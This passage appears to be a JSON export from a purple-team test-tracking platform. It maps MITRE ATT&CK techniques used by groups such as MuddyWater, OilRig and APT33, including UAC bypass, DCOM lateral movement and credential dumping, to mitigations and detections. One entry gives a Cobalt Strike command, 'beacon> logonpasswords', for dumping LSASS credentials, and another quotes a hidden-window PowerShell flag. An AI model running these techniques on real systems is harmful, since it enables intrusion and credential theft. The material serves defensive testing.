be used to gather file and directory information and interact with the Windows API.\n\n### Mac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18","relationship--7aab9015-1839-4672-9a9a-76f478c858a8","relationship--e432b3bc-5539-40e5-bce2-3ba6f463b571","course-of-action--2ace01f8-67c8-43eb-b7b1-a7b9f1fe67e1","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"],"mitreId":"T1083"},"blueTeam":{"successfulDetectionBehaviors":["File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--9add6e28-32ef-4c6c-ad0a-4c7c89c24164","vectrId":"9add6e28-32ef-4c6c-ad0a-4c7c89c24164","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"9add6e28-32ef-4c6c-ad0a-4c7c89c24164","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Component Object Model and Distributed COM","variant":"MuddyWater - Component Object Model and Distributed COM","objective":"Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. \n\nCOM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that has the capability to execute malware via COM and Outlook.Consider disabling DCOM through Dcomcnfg.exe.\n---\nEnable Windows firewall, which prevents DCOM instantiation by default.\n---\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}</code> associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole</code> associated with system-wide security defaults for all COM applications that do no set their own process-wide security.\n---\nEnsure all COM alerts and Protected View are enabled.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7","relationship--319dbc0e-5026-4796-bfd9-43ef3d30eb8d","relationship--055bd398-635f-45e2-94d2-711af316bed7","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--47257f80-df2c-4090-9c2b-6ef23eccdbf3","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--9fab5f0b-d10e-45e3-ab0f-56cadb7ccae9","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--65a4317d-86b2-40c1-9d27-a067bcc2ad80","course-of-action--910482b1-6749-4934-abcb-3e34d58294fc","relationship--e9c5a8f9-571e-4c08-88bb-6baca6dad6ea","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018. https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html","Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019. https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017. https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx","Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017. https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1","Microsoft. (n.d.). Registry Values for System-Wide Security. Retrieved November 21, 2017. https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx","Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017. https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx","Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017. https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/","Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017. https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/","Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017. https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/","Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017. https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/","Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017. https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom"],"mitreId":"T1175"},"blueTeam":{"successfulDetectionBehaviors":["Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{AppID_GUID}</code> associated with the process-wide security of individual COM applications. (Citation: Microsoft Process Wide Com Keys)\n\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole</code> associated with system-wide security defaults for all COM applications that do no set their own process-wide security. (Citation: Microsoft System Wide Com Keys) (Citation: Microsoft COM ACL)\n\nConsider disabling DCOM through Dcomcnfg.exe. (Citation: Microsoft Disable DCOM)\n\nEnable Windows firewall, which prevents DCOM instantiation by default.\n\nEnsure all COM alerts and Protected View are enabled. (Citation: Microsoft Protected View)","Restrict execution of code to a virtual environment on or in transit to an endpoint system."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--9b5c9d9e-ca62-44e7-9160-0f149f6ac05c","vectrId":"9b5c9d9e-ca62-44e7-9160-0f149f6ac05c","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"9b5c9d9e-ca62-44e7-9160-0f149f6ac05c","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Bypass User Account Control","variant":"MuddyWater - Bypass User Account Control","objective":"Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)\n\nAnother bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) uses various techniques to bypass UAC.Remove users from the local administrator group on systems.\n---\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.\n---\nAlthough UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be","relationship--80d612e4-8d4a-45f7-8c29-d44a1aae794c","relationship--629ac426-ec81-4183-80c0-b7fead5e3b19","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--9ae39090-1b20-4a81-8c03-841cd46d0f0b","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--483a70b9-eae9-4d5f-925c-95c2dd7b9fa5","course-of-action--beb45abb-11e8-4aef-9778-1f9ac249784f","relationship--f5ba1404-3e7e-4692-8a39-9e62e5d9542c","course-of-action--2c2ad92a-d710-41ab-a996-1db143bb4808","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014. http://www.pretentiousname.com/misc/win7_uac_whitelist2.html","Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works","Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016. http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass","Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016. https://msdn.microsoft.com/en-us/library/ms679687.aspx","Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016. https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/","Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017. https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/","Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017. https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/","Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016. https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx","Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016. https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware","UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016. https://github.com/hfiref0x/UACME"],"mitreId":"T1088"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate. (Citation: Github UACMe)","Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--9ce03c18-1fc7-4e0e-80dd-dda6d3b1b7b9","vectrId":"9ce03c18-1fc7-4e0e-80dd-dda6d3b1b7b9","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"9ce03c18-1fc7-4e0e-80dd-dda6d3b1b7b9","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Hidden Window","variant":"CopyKittens - Hidden Window","objective":"Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n","command":"[CopyKittens](https://attack.mitre.org/groups/G0052) has used <code>-w hidden</code> and <code>-windowstyle hidden</code> to conceal [PowerShell](https://attack.mitre.org/techniques/T1086) windows.Limit or restrict program execution using anti-virus software. On MacOS, whitelist programs that are allowed to have the plist tag. All other programs should be considered suspicious.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf","relationship--948a5d37-65d1-403f-99bb-0f08186aeebc","relationship--edb697fa-d6b2-400a-acad-ccacc38c87c0","course-of-action--fae44eea-caa7-42b7-a2e2-0c815ba81b9a","relationship--a80b33dc-0fe2-4b0d-a815-51a036fa410f","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]}],"references":["ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017. http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf","Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017. https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/","Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019. https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1"],"mitreId":"T1143"},"blueTeam":{"successfulDetectionBehaviors":["Whitelist programs that are allowed to have this plist tag. All other programs should be considered suspicious.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--9d2c89c9-89a0-4648-9280-7daf9447b9bf","vectrId":"9d2c89c9-89a0-4648-9280-7daf9447b9bf","name":"","offset":0,"createTime":1.55199610417E12,"updateTime":1.551996203784E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"9d2c89c9-89a0-4648-9280-7daf9447b9bf","icon":"icons/terminal-black-alt-2.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Credential Dumping","variant":"Extract Logonpasswords via Beacon Logonpasswords","objective":"Use beacon's logonpasswords to extract credentials from LSASS process memory","command":"beacon> logonpasswords","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Medium","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":null,"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["1) Suspicious process execution is blocked by EDR or other endpoint security tool","2) Enable additional LSA protections to prevent traditional process dumping of LSASS"],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--9dbc2d02-e30d-404c-a800-f94cbbe59e9a","vectrId":"9dbc2d02-e30d-404c-a800-f94cbbe59e9a","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"9dbc2d02-e30d-404c-a800-f94cbbe59e9a","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Screen Capture","variant":"OilRig - Screen Capture","objective":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\n### Mac\n\nOn OSX, the native command <code>screencapture</code> is used to capture screenshots.\n\n### Linux\n\nOn Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has a tool called CANDYKING to capture a screenshot of user's desktop.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688","relationship--45cd89d8-68fd-42a2-94ba-7796a696bc47","relationship--366214ea-29b0-458a-a852-7a76420783d2","course-of-action--51b37302-b844-4c08-ac98-ae6955ed1f55","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017. https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"],"mitreId":"T1113"},"blueTeam":{"successfulDetectionBehaviors":["Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a00f5355-d55d-4939-b4ef-7cae2af33ae8","vectrId":"a00f5355-d55d-4939-b4ef-7cae2af33ae8","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"48dc2baf-1d23-46cb-bb6f-ef36bc0db493","templateId":"a00f5355-d55d-4939-b4ef-7cae2af33ae8","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Exploitation for Privilege Escalation","variant":"APT33 - Exploitation for Privilege Escalation - PoshC2 - Empire","objective":"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform Privilege Escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization.\n---\nUpdate software regularly by employing patch management for internal enterprise endpoints and servers.\n---\nSecurity applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation.\n---\nMake it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.\n---\n[Empire](https://attack.mitre.org/software/S0363) can exploit vulnerabilities such as MS16-032 and MS16-135.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["740b39a7-cf4c-4c2d-acf1-585754a5b04f","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839","relationship--f72d9afb-4eb1-4030-9d91-938f80c4bf6e","relationship--d2a028a0-3c4f-4984-be51-80dbcf93a1a9","course-of-action--92e6d080-ca3f-4f95-bc45-172a32c4e502","relationship--c6615e27-5984-44b3-82dc-f710c6823834","course-of-action--874c0166-e407-45c2-a1d9-e4e3a6570fd8","relationship--22d11711-5794-42aa-a9c5-02895fe3420d","course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b","relationship--267fa35c-7748-40eb-87ba-bddc0c88d643","course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3","relationship--5edeca3e-96aa-45e6-b99b-044e25cb3245","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","tool--4b57c098-f043-4da2-83ef-7588a6d426bc","relationship--248b1bfc-5f9a-4f2c-ad6c-556045d9e83b","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--4507b